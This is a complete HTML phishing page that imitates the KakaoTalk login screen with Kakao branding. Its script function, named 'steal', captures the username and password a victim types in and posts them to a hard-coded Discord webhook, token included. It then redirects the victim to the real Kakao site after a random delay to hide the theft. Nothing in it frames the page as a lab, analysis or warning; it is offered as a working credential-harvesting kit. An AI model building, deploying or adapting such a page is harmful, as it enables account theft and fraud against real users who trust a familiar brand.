<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KakaoTalk</title>
  <link rel="icon" href="https://www.kakaocorp.com/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 400px; /* Larger container */
      margin: 80px auto;
      padding: 50px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .heading {
      font-size: 36px;
      font-weight: bold;
      color: black; /* Kakao in black letters */
      margin-bottom: 20px;
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    .box {
      border: 1px solid #dbdbdb;
      padding: 20px;
      margin-bottom: 20px;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: transparent;
      border: none;
      border-bottom: 1px solid #dbdbdb; /* Underlined input fields */
    }

    button {
      background-color: #ffcc00; /* KakaoTalk's signature yellow color */
      border: none;
      color: black; /* Black letters in the button */
      padding: 10px;
      margin-top: 10px;
      width: 100%;
      font-weight: normal; /* Non-bold font */
      border-radius: 4px;
      cursor: pointer;
    }

    .qr-box {
      border: 1px solid #dbdbdb;
      padding: 15px;
      margin-top: 20px;
      background-color: #fafafa;
      cursor: pointer;
    }

    .or-separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .or-separator::before,
    .or-separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 13px;
    }

    .footer {
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
      margin-top: 20px;
    }

    .footer a {
      color: #8e8e8e;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="heading">Kakao</div> <!-- Large Kakao phrase in black letters -->
    <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo"> <!-- Kakao logo -->

    <div class="box">
      <form onsubmit="steal(event)">
        <!-- Underlined input fields -->
        <input class="input-field" id="username" type="text" placeholder="KakaoMail ID, email, or phone number" required>
        <input class="input-field" id="password" type="password" placeholder="Password" required>

        <!-- Simple login information storage button -->
        <button type="button">Simple login information storage</button>

        <!-- Login button -->
        <button type="submit">Log In</button>
      </form>

      <div class="or-separator"><span>OR</span></div>

      <!-- QR Code Login (Gray box) -->
      <div class="qr-box">
        QR Code Login
      </div>
    </div>

    <!-- Below the gray box: additional features -->
    <div class="footer" style="margin-top: 10px;">
      <a href="#">View help</a> | 
      <a href="#">Sign up</a> | 
      <a href="#">Find account</a> | 
      <a href="#">Find password</a>
    </div>

    <div class="footer">
      <a href="#">Terms of Use</a> | 
      <a href="#">Privacy Policy</a> | 
      <a href="#">Customer Center</a><br>
      Â© Kakao Corp.
    </div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault(); // Prevent form submission to handle it in JS

      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      // Create the payload to send
      const data = {
        username: u,
        password: p
      };

      // Send the data to the Discord webhook
      fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `ðŸ›‘ ê°•ì•„ì§€\nUsername: ${data.username}\nPassword: ${data.password}`
        })
      })
      .then(response => {
        // Check if the request was successful
        if (response.ok) {
          console.log("Data sent successfully");

          // Slight random delay before redirecting to KakaoTalk
          setTimeout(() => {
            window.location.href = "https://www.kakaocorp.com"; // Redirect to KakaoTalk's official page after success
          }, Math.random() * 2000 + 1000);  // Random delay between 1-3 seconds
        } else {
          console.error('Request failed with status:', response.status);
          alert('Something went wrong. Please try again later.');
        }
      })
      .catch(error => {
        // Handle network errors
        console.error('Error during fetch:', error);
        alert('Network error. Please check your connection.');
      });
    }
  </script>
</body>
</html>
